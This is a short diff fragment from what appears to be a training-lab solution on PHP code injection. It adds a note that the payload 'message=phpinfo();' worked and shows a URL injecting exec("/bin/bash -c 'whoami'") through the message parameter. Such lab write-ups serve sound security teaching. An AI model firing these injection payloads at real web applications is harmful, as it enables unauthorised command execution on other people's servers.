@@ -44,5 +44,6 @@ Solution
 Low level security: 
 
 ```
+tested with : message=phpinfo(); ==> YES we can !
 phpi.php?message=exec("/bin/bash -c 'whoami'");
 ```
